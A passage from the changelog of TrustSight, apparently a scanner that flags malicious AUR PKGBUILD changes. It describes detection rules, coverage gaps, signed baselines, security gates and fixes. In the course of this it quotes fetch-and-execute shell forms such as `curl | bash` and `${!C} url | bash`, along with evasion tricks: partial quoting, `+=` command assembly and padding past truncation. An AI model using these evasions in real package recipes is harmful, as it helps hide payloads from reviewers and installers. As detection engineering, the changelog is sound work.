  `tests/fixtures/malicious/`), so a fresh clone runs the recall and
  separation gates on the full corpus with no generator step.
  `scripts/verify_fixtures.py` checks every `expected.json` record against
  its `.diff` (no missing bodies, no orphans, per-category counts), and a new
  `fixture-determinism` job regenerates all five generators on a fresh
  checkout and fails if the tree drifts from the committed record.
- **A signed-commit policy, enforced on critical paths.** Changes to the
  tokenizer, scoring, config, database, security gates, CI workflows,
  packaging, and baseline keys must be GPG-signed: `.github/CODEOWNERS`
  assigns those paths to the maintainer, the `verify-commit-sigs` workflow
  checks every critical-path commit in a pull request to `master`, and
  `CONTRIBUTING.md` documents key setup and the list of critical paths.

### Fixed

- **The release archive failed its own `check()` step.** Six tests in
  `tests/test_pkgbuild.py` read `packaging/aur/PKGBUILD`, which GitHub source
  archives exclude by `.gitattributes` `export-ignore` (a tarball cannot
  contain the PKGBUILD for its own checksum). `makepkg -si` from the v0.12.0
  archive aborted with six failures. The PKGBUILD-hygiene tests now skip when
  `packaging/` is absent, and still run in the repository checkout where the
  PKGBUILD lives.

### Stats

- 11 commits since v0.12.0
- 198 files changed, +2370 / -425
- 1536 tests, all passing
- Package version 0.12.1

## [0.12.0] - 2026-08-10

### Added

- **A release channel for every baseline.** All baselines the tool consumes
  now ship as signed GitHub release assets with the `baseline-` prefix:
  `baseline-seed.tar.gz` (the hashed novelty seed),
  `baseline-ioc-<source>-<incident>-manifest.json` / `-iocs.jsonl` (per-curator
  IOC baselines), `baseline-corpus.tar.zst` (the corpus baseline) and
  `baseline-manifest.json` (per-asset SHA-256, size and signature). Every
  asset carries a detached Ed25519 `.sig` under the pinned distribution key,
  verified before any payload is read; a download that does not verify is
  refused, never imported. New in the tool: `trustsight seed fetch` (download,
  verify, import), release-channel `ioc update` (per-curator verification
  preserved on top of the distribution signature), first-run auto-import of a
  missing seed from the channel, and `scripts/build_release_baselines.py`
  (build, sign, self-verify, manifest). The
  [`.github/workflows/baselines.yml`](../.github/workflows/baselines.yml)
  workflow builds and uploads the seed, IOC and manifest assets on every
  published release, signing with the `BASELINE_SIGNING_KEY` Actions secret;
  the corpus baseline is exported by the maintainer and uploaded per the
  publishing guide.
- **A security model, stated and enforced.** [`docs/security.md`](security.md)
  is now the canonical page: TrustSight as a program consuming hostile input
  (Part A), what a verdict claims and does not claim (Part B), an enforcement
  map (Part C), and a vulnerability disclosure policy written for a static
  analyser, with supported versions, severity timelines, and an explicit list
  of what is not a vulnerability (Part D).
- **`scripts/security_gates.py` and a CI job.** Forty-five gates, one per
  invariant: no interpreter or shell execution, version arguments
  shape-checked, network confined to the four fetch modules, one declared host,
  every request timed out, bounded rule matching, bounded and never-indirect
  expansion, data-driven rendering, no archive extraction, parameterised SQL,
  inert terminal output, coverage failing closed, a gap always shown with the
  band, FATAL integrity, seed and baseline containment, reserved names refused
  by every writer. The v0.12.0 additions guard the two new subsystems: an IOC
  match always carries its source (A13b), never contributes to the score (B1),
  is reported when expired rather than silently dropped, and never appears in
  the rule config layer; the novelty seed stores no plaintext identity (P1) and
  hashes deterministically. Three gates guard the
  documentation rather than the code: the maturity numbers in B3 must be derived
  from `scoring._MATURITY_THRESHOLD` rather than copied beside it; every link
  between pages under `docs/` must resolve to a file and an anchor that exist;
  and the doc and the gate list must still describe the same set, so a guarantee
  cannot be added to one without the other.
- **Coverage accounting (`src/trustsight/coverage.py`).** Four gaps are now
  first-class on `PackageFact` and in the JSON: `diff_truncated`,
  `line_truncated`, `tree_not_analyzed`, `unresolved_source`. A gap never adds
  points, but it constrains presentation two ways: it forbids an UNFLAGGED
  verdict (the run reports `Inconclusive` unless a HIGH or worse finding already
  stands), **and** it travels with the band wherever a person sees one, so an
  incomplete run renders as `High (incomplete analysis)` rather than `High`.
  That second half closes the decoy seam: pad past the cap, put the payload
  after the cut, and include one cheap deliberate HIGH in the visible prefix.
  Reported as a weight-0 `COVERAGE` entry in the breakdown and quoted in
  `unresolved_sources`. Machine output keeps `risk` bare with `coverage_gaps`
  beside it, plus `risk_label` for consumers that display a band.
- **`src/trustsight/safe_text.py`.** `clean()` and `safe_markup()` strip ANSI
  and OSC sequences, C0/C1 control bytes and DEL, and neutralise Rich markup,
  applied at every render boundary in `cli/`. Stored evidence and JSON output
  stay byte-exact.
- **`PackageFact.risk`.** The verdict band is now carried on the fact and read
  through `scoring.verdict_level()` (bare band, for machines) or
  `scoring.verdict_label()` (qualified, for people).
- **IOC Federation baseline system (v0.12.0, `src/trustsight/ioc_baseline.py`).**
  A signed, multi-curator, time-bounded inventory of known-bad artifacts
  (domains, file hashes, package names) that sits outside the heuristic score.
  Baselines are Ed25519-signed directories (`manifest.json` + `iocs.jsonl`),
  imported per source and replaced idempotently; each match names the curator
  that flagged it (attribution, not aggregation), carries its incident and
  evidence URL, and reports expiry rather than silently lapsing. A new
  `IOC Match` stage runs after rule matching and attaches
  `PackageFact.ioc_matches`; matches never enter `score_breakdown` and never
  move the number. New `[baselines.ioc]` config section, `ioc_entries` table,
  and `trustsight ioc {sources,import,update,list,export}` commands. See
  [the IOC reference](reference/ioc.md).
- **User-data hashing for the novelty seed (v0.12.0).** The bundled seed's
  ~36k maintainer names and emails are stored as salted SHA-256 hashes, not
  plaintext: the novelty and maturity signals need only "have we seen this
  identity before", never the literal string. A per-seed 32-byte salt defeats
  precomputed tables; the salt travels in `seed_meta`. Names and emails are
  normalised (`strip().lower()`) at one hashing chokepoint so the seed build,
  the plaintext-to-hashed migration, and every runtime lookup agree. An old
  plaintext seed is migrated on first run and the original table renamed to
  `maintainers_deprecated_backup`. New `maintainers_hashed` /
  `package_maintainers_hashed` tables and `trustsight seed {info,stats,migrate}`
  commands. Documented in [seed provenance](explanation/seed-provenance.md).
- **Committed-file scanning (`differ.companion_source_hunks`).** A payload that
  ships as a file inside the AUR repo (declared in `source=()` or merely named
  by the recipe, e.g. `bash "${startdir}/helper.sh"`) is now read with the same
  rules as the PKGBUILD. The differ used to feed only `PKGBUILD`, `.SRCINFO`
  and `*.install` to the scanner, so a `curl | bash` moved one file over
  reached no rule; the whole current content of every companion the recipe
  names is scanned, so a payload committed earlier and referenced later is
  still seen. Unreferenced committed files are left alone.
- **Two coverage gaps.** `unresolved_source` now tracks a multi-line
  `source=()` array whose `$(...)` rides a continuation line, not only the
  opener; and `unresolved_parse_time` records a top-level command substitution
  that runs while makepkg *sources* the PKGBUILD for metadata, before any rule
  reads it. Both fail closed to `Inconclusive`.
- **R137 (Fetch Then Execute, CRITICAL).** The split download-then-run form a
  reviewer would read as two innocuous lines: a downloader writes a file and
  the same function later executes it. R001/R002 own the single-line pipe;
  R137 owns the split.

### Changed

- **The release channel is its own release kind.** Baseline assets
  (`baseline-*`) ship on `baseline-<date>` channel releases, published after
  the software release they serve so the tool's default `latest` channel
  resolves to them; software releases (`vX.Y.Z`) never carry baseline assets.
  The release baseline workflow only runs for `baseline-*` tags and manual
  dispatch.
- **The novelty seed no longer ships inside the package.** The 20 MB
  `src/trustsight/data/seed.db.gz` is gone from the repo, wheel and package;
  the seed is distributed as the signed `baseline-seed.tar.gz` release asset
  (v2 hashed format). First-run auto-import keeps working by fetching and
  verifying the channel asset (silently skipping on failure or offline), and
  `seed fetch` imports it on demand. The security model's network doctrine
  now names **two declared hosts**: `aur.archlinux.org` everywhere, and
  `github.com` confined to the new fetch module `release.py` (seed fetch,
  `ioc update`, first-run import), with the `network confined to the fetch
  modules` and `one network host, declared` gates updated to match.
- **`trustsight full-aur` is safe by default: no accidental whole-AUR scrape.**
  A missing snapshot used to silently trigger a from-scratch bootstrap that
  fetched every PKGBUILD in the AUR (~120k). That now **refuses** unless
  `--bootstrap` is passed. Every cycle, delta or bootstrap, is capped at
  `[limits] corpus_max_per_cycle` (default 2000) and resumes automatically, so
  a large amount of work advances in bounded, resumable chunks instead of one
  avalanche; a capped cycle does not advance the snapshot, run the corpus
  sweep, or export a half-built corpus until the transition completes.
  `--resume` is now implied (cycles resume on their own) and kept only for
  compatibility. The intended cadence is incremental: run `full-aur`
  periodically so each cycle fetches only the changed packages.
- **`trustsight full-aur` is faster, rate-limited, and shows progress.** The
  corpus build fetched one PKGBUILD per package serially, with feedback only
  every 1000 packages. PKGBUILDs are now fetched a window ahead, several at a
  time (`[limits] corpus_fetch_workers`, default 5); analysis stays serial and
  in package order so novelty still reads earlier packages' observations. The
  fetcher is a good citizen to the AUR's cgit (which rate-limits per IP and
  runs anti-scraping): a global aggregate rate cap (~5 requests/second) bounds
  the request rate regardless of worker count, and requests retry with
  exponential backoff on `429`, `5xx` and connection resets, honouring a
  `Retry-After` header. On an
  interactive terminal the analysis loop renders a live progress bar on stderr
  (current package, `M/N`, elapsed, ETA), and falls back to periodic log lines
  when there is no TTY or under `--json`. Benign per-package snapshot fallbacks
  (a VCS or `-bin` package with no tarball) dropped from a warning per package
  to debug, and a genuinely unfetchable PKGBUILD is counted and reported once.
  A latent `TypeError` on the reserved-name path (`_logger()` called without
  its argument) is fixed.
- **The tokenizer normalises partial quoting.** `c"u"rl` and `ba"sh"` are
  reconstructed to `curl` and `bash` before rules match, the non-empty twin of
  the empty-quote rule, so intra-word quoting no longer hides a literal from
  the resolved-line rules. A standalone quoted argument (a message, a URL, a
  `depends` entry with structure) keeps its quotes, so tokenisation for the
  other rules does not shift.
- **Maintainer identities hash through one chokepoint.** `db._hash_maintainer_value`
  delegates to `seed_build._hash_value`, and both normalise `strip().lower()`,
  so a maintainer whose name or email differs only in case or whitespace is one
  identity rather than a fresh novelty signal every time. The two formulas used
  to be copied in two modules; identical then, they could drift, and a drift
  would silently miss every lookup.

- **Declared verification is no longer credited (B10).** Checksums,
  `validpgpkeys`, GPG signature sources, source pinning and trusted-forge
  hosting were worth up to 25 points of discount. They are now weight-0
  findings in a new `P` namespace (`P001`-`P003`, `P005`-`P007`), reported in
  their own group under the line "TrustSight does not verify these claims. It
  reports that the recipe makes them." `[verification_evidence]` and
  `[pinning_weights]` are removed from the shipped config, so a local
  `config.toml` cannot reintroduce a credit, and `trusted_forge` is 0.

  These are **declared-practice findings**, not benign rules: they do not
  establish that anything is benign, only that the recipe declares a practice.
  Everything TrustSight sees is attacker-declared and TrustSight never fetches,
  so a signal an attacker can assert for free must not be able to lower a score.

  **Measured consequence.** Benign p95 moved 35 to 45 against the 3,246-diff
  corpus, and benign diffs above the 20-point threshold moved 8.9% to 16.3%.
  Separation still holds (benign p95 45 < malicious p5 60) with the margin
  narrowing from 25 to 15. The `control-bin-package-declared-source` fixture
  moved 20 to 35: it remains a control for the delivery rules and is no longer
  one for the threshold. Twenty is left as the published threshold because
  moving it is a calibration decision with its own evidence.

- **`docs/security.md` no longer claims 20 is the benign 95th percentile.** It
  was, before B10; it now sits at the 83.7th. The page states the measured
  distribution instead, and the gate fails if the stale claim returns.

- **Every page describing the subtractive model rewritten**: the scoring
  formula and tier map in `rules.md`, the Tier D tables in `evidence-tiers.md`,
  the "Why verification subtracts" section in `scoring-philosophy.md`, the
  worked examples and breakdown legend in `reading-a-report.md`, plus
  `configuration.md`, `explanation/index.md`, `corpus-and-priors.md`,
  `cold-start-and-maturity.md`, `auditing-before-update.md`,
  `configuring-rules-and-weights.md` and `index.md`. The calibration figures in
  `reading-a-report.md` were re-derived rather than adjusted: zero-rate 74.9% to
  69.1%, benign p95 30 to 45, test count 1,365 to 1,377.
- **Generators are record-preserving.** `gen_malicious_fixtures.py` no longer
  deletes diffs it does not own, `gen_injection_fixtures.py` merges with the
  existing record instead of overwriting it, and
  `gen_historical_holdout_fixtures.py` keeps curated entries verbatim.
  Regenerating any generator on a clean tree is now a no-op by construction.
- **R012 `user:` role marker relabelled as a negative control.** The engine
  deliberately excludes `user:` role markers (a question addressed to a model
  carries no instruction); the generator previously emitted
  `R012-v5.diff` as a positive, which failed the malicious-recall gate. It is
  now a documented negative (`must_not_fire: [R012, R013]`, `max_score: 0`).
- **`R029-known-dep-added` record dropped.** A vestigial placeholder
  (`must_fire: []`, `max_score: 0`, `known_packages` gate) with no rule
  implementation, no diff body, and no code path referencing it; keeping it
  would fabricate a fixture for a rule that does not exist.
- **Channel releases keep the canonical seed and prove their own plumbing.**
  The baselines workflow now checks the channel release for an existing
  `baseline-seed.tar.gz` before building: the canonical seed is
  maintainer-built from the full AUR mirror and uploaded, and CI rebuilds a
  lock-derived fallback only when it is missing (auditable but smaller, and
  never overwriting an uploaded seed). Every seed built by the published
  scripts now ships `trustsight-seed-v2/seed-provenance.json` (source mirror
  path and size, package, maintainer and observation counts, build timestamp
  and command line), written by `generate_seed.py --provenance-out` and
  copied into the archive by `build_hashed_seed.py --provenance`, so anyone
  can reproduce the seed and diff their record against the published one. A
  manual workflow run doubles as a pipeline test; see
  [publishing baselines](contributing/publishing-baselines.md#dispatch-test-manual-verification).
- **Release tarballs no longer carry `packaging/`.** `export-ignore` keeps
  the PKGBUILD out of the GitHub source tarball, so the release artifact can
  no longer disagree with itself. The CI side of the checksum contract is
  v0.12.1: `release-pkgbuild.yml` computes the checksum from the served
  tarball, verifies it with `makepkg --verifysource`, and commits it to the
  default branch; `pkgbuild.yml` downloads the actual release tarball and
  fails the build on a checksum mismatch instead of building with
  `--skipchecksums`.
- **Machine-readable output stays machine-readable.** `review`, `inspect`,
  `history`, `list`, `corpus` and `ioc` in `--json` mode keep stdout a pure
  JSON document: warnings and progress events go to stderr, errors become a
  JSON error object with exit code 2, and `review --json` results carry an
  explicit `failed` flag, unconditional `suppressed_rules` and `ioc_matches`,
  and score fields only under `--score` and `--risk`. Negative `--limit`
  values and unknown `--type` values are rejected with a clean error instead
  of a traceback.
- **IOC and baseline handling hardened.** `ioc import` dedupes identical
  rows instead of crashing, keeps expired rows of a source across
  re-imports (`entries_skipped`), treats naive `expires_at` values as UTC,
  and reports malformed manifest versions or encodings as clean errors;
  `ioc update` honours `TRUSTSIGHT_OFFLINE`; `ioc export` refuses to
  overwrite an existing file; `ioc sources` drops the placeholder row. The
  seed and baseline import path rejects archive members that escape the
  extraction directory (absolute paths, `..` segments), `import-baseline`
  refuses a non-file path, and `db check` and `db backup` survive a corrupt
  database with readable errors and validate the backup output path.
- **`full-aur` refuses to do nothing silently.** An empty metadata fetch no
  longer clobbers the stored snapshot, fetch failures are wrapped in
  actionable errors, a missing `--sign` key is a hard error, invalid watch
  intervals are coerced to the floor, and a failed watch cycle is retried
  instead of killing the watcher. `config set` validates keys and value
  types and `config show` tolerates hand-edited non-integer weights;
  `override` tolerates null reasons and dedupes new entries; `forget
  --prune` refuses partial RPC replies and handles EOF on confirmation;
  discovery reports a friendly error when pacman is missing from PATH; the
  display layer escapes rich markup in untrusted messages.

### Added

- **B7, a change summary on every result.** `changes` on `PackageFact` and in
  the JSON, sibling to `findings` and `coverage_gaps`, so "nothing fired" cannot
  read as "nothing happened". Plain strings, no severity, never in
  `triggered_rules`; `.SRCINFO` and `.gitignore` suppressed as always-noisy.
- **B8, findings are checkable.** Content rules carry `file` and `line`; the 40
  rules that legitimately cannot (temporal, maintainer, corpus, longitudinal,
  dependency) declare an evidence class in `findings.NON_CONTENT_RULES` rather
  than omitting the field silently.
- **B9, no output grants permission to skip review.** A denylist over the
  rendering templates, which caught a live violation on its first run: the
  no-findings verdict ended "No risk signals fired." with no direction to
  review, and now reads "No published rule matched. Review the diff before
  building."
- **`scoring.FLAG_THRESHOLD`**, so the 20-point threshold is read rather than
  repeated.

### Fixed

- **Resolved rules lost their line numbers.** Fifteen shipped rules
  (`R001`, `R002`, `R003`, `R008`, `R012`, `R039`-`R045`, `R055`-`R057`)
  match `match_target = "resolved"`, and `apply_rules` looked a finding's
  location up in `line_map` by the finding's position in the compacted
  resolved list - but `line_map` is keyed by raw diff-line index, and the
  resolved list omits assignment lines, so the positions did not line up.
  Every resolved rule fired with no `file`/`line` (or, on a position
  collision, the wrong one). The tokenizer now records the raw diff-line
  index of each resolved string (`tokenize_and_resolve_indexed`), and
  `apply_rules` maps through it; `full_aur` gained the `line_map` it never
  passed. The B8 gate, which caught this in CI, now runs under
  `shipped_config()` so a local `rules.toml` that overrides a rule's
  `match_target` can never mask it again.

- **Three render bugs found by looking at the output, not by a gate.** The
  Score row printed the previous row's caption as the risk band (a `for label,
  value in rows` loop shadowed it); the tool's own `[cyan]` markup printed
  literally in the Rules Triggered rows, because it was passed to
  `Text.assemble`, which does not parse markup; and the declared-practice group
  left a ragged empty column for findings with no line number.

### Added (security model corrections)

- **B1 restated: determinism is algorithmic, not configurational.** "The same
  input always produces the same number" was false, and invited a Part D report
  under the nondeterminism clause: two operators with different `rules.toml` get
  different scores by design. Reports now carry a **`config_fingerprint`**, a
  digest over the effective ruleset, scoring weights, thresholds and active
  overrides, so the claim is checkable. Part D's clause now reads "the same
  input, under the same `config_fingerprint`, producing different numbers".
- **A14, the overarching resource guarantee.** A4 bounds what arrives, A5 what
  is matched, A6 what is expanded; together, no package-controlled input decides
  how much CPU, memory, network or disk this process uses. Every bound is a
  source constant rather than a function of the input, and every bound that
  drops content records a coverage gap, tying the guarantee to B2 so a bound can
  never be used as a quiet skip.
- **B9 inverted from denylist to structural requirement.** A denylist over
  phrasings is a treadmill. Every verdict now ends with a direction to review,
  and the primary gate asserts that the direction is **present** rather than
  that a phrasing is absent. Four of the five verdict paths were ending without
  one (first analysis, first analysis with versions, the FATAL path, and the
  signals path); FATAL now ends "Do not build this package. Inspect the diff and
  report it." The denylist is retained as a secondary check and is now scoped to
  **template text only**, via AST rather than a line regex, so a package named
  `safe-rs` or `clean-arch` cannot trip it. That is A7's separation applied to
  B9: templates are code-owned and checked, fields are package-owned and never
  checked.
- **A3 addendum: cloning executes nothing.** libgit2 runs no hooks on clone and
  TrustSight configures no `clean`, `smudge` or `fsmonitor` filter, the
  git-config paths where a fetch becomes an execution. Documented as a property
  of the library rather than a control this project adds.
- **A10 addendum: sanitisation is not transliteration.** A name built from
  homoglyphs renders as the characters it contains, because rewriting an
  identifier would misrepresent what is installed. Name-level confusability is a
  detection concern, not a rendering one.
- **Baseline import reports its delta** instead of warning on it: "N package(s)
  moved from no-history to warm". A threshold on "novelty dropped across many
  packages" would fire on the success case, since that is a baseline's entire
  function. A13's real defence is the bound on what a baseline may write.

### Fixed (audit pass)

- **`forget --prune` echoed database-stored package names raw.** The A10 gate
  exercised the review, inspect and corpus renders and not `forget`, `history`
  or `list`, so the one surface printing unsanitised names was outside it. Now
  cleaned, and the gate renders six surfaces instead of four.
- **`history` and `list` re-derived the band from the saved score**, so a run
  that `review` reported as `Inconclusive (incomplete analysis)` displayed a
  bare "Low" or "Medium" the next time it was listed, violating B2 on two
  surfaces. `scoring.stored_band()` now reads the band and gaps from the row's
  `fact_json`; rows written before that field existed fall back to the derived
  band and are reported as complete, which is the only honest thing to say
  about them. Band colour keys off the bare word via `display.band_colour()`.
- **The change summary never reported dependency changes.** Dead twice over:
  `fact.dependency_changes` was set by nothing, and `changes.summarise` read a
  `{op: names}` shape while `extract_dependency_changes` returns
  `{field: {added names}}`. Adding `depends=('qt6-svg')` now yields
  `depends: +qt6-svg`.
- **`DECLARED_DEFAULT` was defined and referenced nowhere**, so every declared
  practice rendered every time and B10's documented default-subset behaviour did
  not exist. Now applied: the surprising-by-absence set (`P002`, `P003`, `P005`)
  renders by default with "N more declared practice(s); --verbose to list them",
  and `P` findings no longer duplicate into the Rules Triggered block.
- **The calibration wording overclaimed.** `calibration_gates.py` re-computes
  benign p95 and malicious p5 on every push and nothing else, so the aggregate
  figures are a point-in-time measurement. `security.md` now says so, and
  `fire-rates.md` actually publishes the table it was said to publish.
- **The seed release path logs through a real logger.** `db.py` referenced a
  module `log` it never defined, masked until now by a broad exception
  handler, so failures while seeding from the release channel died without
  a reason; the module logger is defined and a test pins the failure path.
  `config.py`'s `\s` escape no longer triggers a SyntaxWarning, and
  `export.py` drops a dead assignment left over from the baseline export
  rework.

### Performance

- **Analysis is about 42% faster: 14.9 ms to 8.7 ms per diff**, and a full
  3246-diff corpus scan now completes in 31s. Detection is bit-identical: the
  calibration gates, the campaign fixtures and the whole suite were re-run after
  each change.
  - `tokenizer.resolve_added_lines` is memoised per thread. Twenty call sites in
    `analysis/` asked for the resolved form of the same diff and it was
    recomputed every time, about a third of the cost. Keyed on identity rather
    than equality, because hashing a multi-megabyte diff twenty times to avoid
    computing it twenty times is not a saving.
  - `rules._classify_enclosing_function` is memoised the same way, keyed on
    content because each of its fifteen callers holds its own copy.
  - `config.load_toml` gained `copy_result=False` for the six accessors whose
    callers treat the result as read-only. `load_rules` and `load_config` keep
    the deepcopy: `apply_rules` genuinely assigns to `rule["pattern"]`.
  - Both memos are thread-local. `review` analyses packages in a pool, and a
    shared cache would need its eviction sweep to be atomic with the insert; it
    is not, and a `KeyError` in a worker surfaces as "this package was NOT
    vetted". Five tests pin the properties that make the memos safe: no sharing
    between callers, no confusion between diffs, no leakage across threads, and
    no mutation of the shared config tables.

### Fixed

- **The truncation bypass.** Padding a diff past `max_diff_bytes` and appending
  the payload turned a High into a Low. `diff_truncated` was set, serialised,
  and consumed by nothing but a sentence prepended to the verdict. It is now a
  coverage gap, and `scan_diff` applies the same cap the git path always did.
- **`Inconclusive` was computed and then discarded.** Every CLI path re-derived
  the band with `risk_level(final_score)`, which cannot express it, so the
  downgrade never reached the output.
- **AUR-controlled text reached the terminal raw.** Package names, maintainer
  names, file paths and quoted evidence could clear the screen, forge a
  verdict, recolour a row, or abort the render of a whole review batch with an
  unbalanced Rich tag.
- **A seed could rewrite the database it was merged into.** `import_seed`
  copied `seed.metadata` wholesale with `INSERT OR REPLACE` and overwrote
  `maintainer_counts`. It is now limited to the two keys a seed owns, cannot
  raise a locally learned maintainer count (which would suppress R071/R090),
  and records the imported artifact's SHA-256 and origin.
- **A FATAL rule could be deleted from `rules.toml`.** `override.py` already
  refused to suppress a FATAL *finding*; deleting or downgrading the *rule* was
  unguarded. `config.enforce_fatal_rules()` now re-asserts the shipped FATAL
  set in memory at load, warns, and writes nothing back.
- **The AUR metadata fetch had no timeout and no response cap**, unlike every
  other fetch path. It is on the default `review` path, so it was the one that
  would hang.
- **Rule patterns ran on unbounded lines.** Input is clamped to 8 KiB per
  logical line before matching, which bounds every pattern at once. The clamp
  is itself a truncation seam, so a diff containing an over-length line now
  records the `line_truncated` coverage gap rather than skipping the tail
  silently.
- **`_MAX_EXPANSION_DEPTH` was declared and never applied.** Removed, along
  with a dead helper in `resolve_expansions`. A bound nothing enforces reads
  like a guarantee. The bounds that are real (passes, value length, line
  length, table size, and refusing `${!x}` and `${#x}`) are now stated as
  invariant A6.
- **Config lists became regex.** `hosts.toml` ports and TLDs are now escaped
  before being joined into the R047/R048 patterns.
- **`corpus pivot` read a snapshot from the working directory**, so the answer
  depended on where the command was run and a planted file could steer it. One
  location now, under the config directory.
- **Three more instances of one recurring failure**, now written up in
  [reviewing a security control](contributing/security-review.md): a control
  applied at one of several equivalent call sites, with the gate pointed at a
  covered one.
  - `terminal output is inert` exercised `review`'s renderer only.
    `_inspect_rich` interpolated a rule id raw and leaked escape sequences; the
    gate now renders through four paths and names them in its result, and
    `cli/corpus._render_pivot` was extracted from its command so it could be
    one of them.
  - Four of the five `PackageFact` producers set `coverage_gaps`. The
    first-analysis path declared `tree_analyzed=True` having read no tree at
    all and reported a bare "Low". The new `every result declares its coverage`
    gate walks the AST for every construction, so a sixth producer fails rather
    than shipping a false coverage claim.
  - `pacman -Sl <repo>` had no `--` separator, unlike the `pacman -Q` call
    beside it. The repo name is operator input rather than package input, so
    this is consistency rather than a hole, but the separator is free.
- **The line clamp only covered half the rule engine.** A5 claimed the 8 KiB
  per-line bound applied to every pattern "in a way that no per-pattern audit
  can". It applied to `apply_rules`, which runs the ~30 patterns in
  `rules.toml`, and not to the ~88 patterns emitted from `analysis/`, which
  match the diff text directly. Measured on one 5 MiB line: 0.17s through
  `apply_rules`, 15.06s through the code-emitted rules, an attacker-chosen
  multiplier on review time bounded only by `max_diff_bytes`. `rules.clamp_text`
  now clamps the text handed to the code rules at all three call sites,
  shortening lines without dropping them so line numbers stay aligned. Same
  input is now 0.54s end to end, with `line_truncated` still recorded. The gate
  was measuring `apply_rules` alone, which is why it reported the property as
  held; it now measures `scan_diff` end to end and asserts the gap is recorded,
  so bounding the work cannot silently bound the evidence.
- **The reserved-name guard covered one writer of three.** `upsert_package`
  refuses `__seed__` and any `__`-prefixed name; `save_package_profile` and
  `save_pkgbuild_snapshot` did not, and both are on the `import_baseline` path.
  AUR names may begin with an underscore, so `__seed__` is registrable. No leak
  into user-facing queries was reachable (those filter the sentinel), so this
  was a latent inconsistency rather than a demonstrated exploit. All three
  writers now refuse, `db.is_reserved_name` lets corpus callers skip instead of
  raising, and the baseline importer treats a rejected row like a nameless one:
  logged and skipped, never fatal to the import.
- **A heading rename could silently break every link to it.** Renaming a
  section leaves every sentence on the page true and quietly disconnects the
  claims that pointed at it, with nothing failing anywhere: the documentation
  form of skipping content without recording a coverage gap. It nearly happened
  when B2 was reworded. The `doc cross-references resolve` gate now walks every
  `docs/**` link, resolves the file and the anchor, and fails the build on a
  dangling one. Inline code and fenced blocks are excluded, since a rule
  pattern such as `(?<![^\x00-\x7F])[...]` contains `](...)` and is not a link.
- **Two `--help` tests asserted on styled bytes.** Rich renders an option's
  leading hyphen as its own span, so the literal `--repo` is not in the output
  even though the flag is there, and which spans Rich splits moves between
  versions. The assertions now strip styling with the project's own
  `safe_text.clean`, which makes them width- and version-independent and
  exercises the sanitiser at the same time.
- **`differ.map_diff_lines` corrupted filenames.** `lstrip("b/")` strips
  characters, not a prefix, so `+++ b/build.sh` reported findings against
  `uild.sh`.

### Changed

- **`docs/contributing/security-review.md`**, a new page: how to scope a gate so
  it covers the entry point an attacker reaches, the four times this project got
  it wrong, and a table of which gates enumerate the whole source and which
  sample a single path.
- **Punctuation normalised across the docs** to `: ; , () -`, with no em dashes,
  en dashes or spaced `--` anywhere. Pinned by `test_docs_use_standard_punctuation`,
  because it had drifted back three times.
- **`docs/security.md` reorganised around a thesis.** The page now opens with
  the position it is defending (TrustSight is the instrument panel, not the
  airworthiness certificate; a sensor that was never wired must not read the
  same as a sensor reporting zero) and the evidence taxonomy that follows from
  it, before the four parts that make it enforceable. The operative claim
  is that the tool must never move between taxonomy rows silently, which is
  what Part B's coverage rules and Part C's gates exist to prevent.
- **`--watch` is described in Part A.** A watch loop changes the volume of
  fetching, not its shape: per-request bounds still apply, plus an interval
  floor and an optional cycle count. The absence of any hook or notification
  command is now stated explicitly, along with the boundary such a hook would
  need if one is ever added, since it would receive attacker-influenced JSON.
- **`docs/security.md` states its assumptions.** The trust boundary is now
  explicit and complete: the Python runtime, the operating system, local
  filesystem permissions, the TLS trust store, CI, and the tool's dependencies
  (`rich`, `pygit2`, `typer`, `tldextract`, SQLite, `libc`) are all trusted
  rather than defended. If any of them is compromised, the page states, the
  model no longer applies. What was implicit is now the border.
- **Rendering has no model in it, and that is now a stated invariant.** Verdict
  text is a template keyed by rule id filled with named evidence fields;
  values are substituted, never re-expanded or evaluated, and no template comes
  from package-controlled text. The output path therefore has no network
  dependency, no nondeterminism, and no prompt-injection surface. R012 still
  detects injection aimed at whoever reads the diff.
- **Maturity numbers made exact across the docs.** `_MATURITY_THRESHOLD` is 50,
  so the Inconclusive gate at `maturity < 0.5` means fewer than 25 recorded
  analyses. Pages variously said "50 observations" or "approximately 25"; they
  now say both numbers and how they relate.
- **Documented claims corrected to match the code.** The `source_resolution`
  field named in four pages never existed; "no external API is involved" was
  false (four AUR endpoints, now stated precisely); the Inconclusive predicate
  was documented as stricter than it is; R122 is documented as having no call
  site rather than implying corpus-side coverage it does not have; the exit
  code table claimed a flag-driven exit that was never implemented, and
  `docs/guides/using-in-ci.md` gated on a JSON shape `review --json` does not
  emit.
- **The exit-code contract is now enforced, not just documented.** An
  operational failure exits 2 everywhere: `cli/main()` wraps the app so an
  uncaught failure exits 2 with a message on stderr, and the remaining
  operational `Exit(1)` sites (review discovery, inspect not-found, forget
  prune/abort, override add/remove, db check, lint-rules) now exit 2. Exit 1
  is no longer used by any command; a verdict still never changes the exit
  code.

### Added

- **R132: a command or shell named through `${!name}` indirection.**
  `C=curl; ${!C} url | bash` runs curl while the recipe carries no literal
  curl and no literal shell for R001/R002/R129/R121 to name, because the
  tokenizer refuses to evaluate indirection it cannot know statically.
  Flagging the indirection itself (CRITICAL, obfuscation, staged
  `anti_analysis`) closes that whole family; the benign `${!arr[@]}` and
  `${!prefix*}` key-and-name-listing forms are excluded by construction.
- **The evasion fixture corpus (`scripts/gen_evasion_fixtures.py`).** Recipe
  shapes that bypass the engine are written down *before* they are closed and
  kept as the record of what the engine can and cannot yet see. Six original
  evasions (indirect expansion, `+=`-accumulated commands and deps,
  heredoc-fed and heredoc-written recipes), of which five are now detected
  and relabelled into the recall corpus, plus three new open gaps filed for
  the rules that will close them: R133 (array-subscript routing), R134
  (nameref routing) and R135 (command-substitution spelling). Each fixture
  enforces its state in both directions: an open gap must fail its label,
  a relabelled fixture must pass it, so a patch that closes a gap turns
  `gate_known_gaps_unchanged` red instead of leaving a stale record.

### Changed

- **The source-bucket prior scores at its worst URL, not its sum.** Each
  added URL contributed its bucket modifier individually, so appending the
  same suspiciously hosted URL many times (the `discord_arch_electron`
  case: ~26 entries at +20 each) stacked into CRITICAL on the strength of a
  single weak fact. The prior is now the maximum modifier over all added
  URLs: one diff whose provenance is unknown, not thirty separate facts,
  which restores the calibration separation (benign p95 strictly below
  malicious p5). `homograph_attack` still dominates at +30, and trusted
  forges still contribute nothing.
- **The assignment resolver accumulates `+=`.** `_ASSIGNMENT_RE` now reads
  the operator: `=` is a fresh binding, `+=` appends to the current value
  (a fresh name starts empty, matching bash). A fetch command assembled
  across `C+=curl` / `C+=' https://…'` lines therefore resolves to a
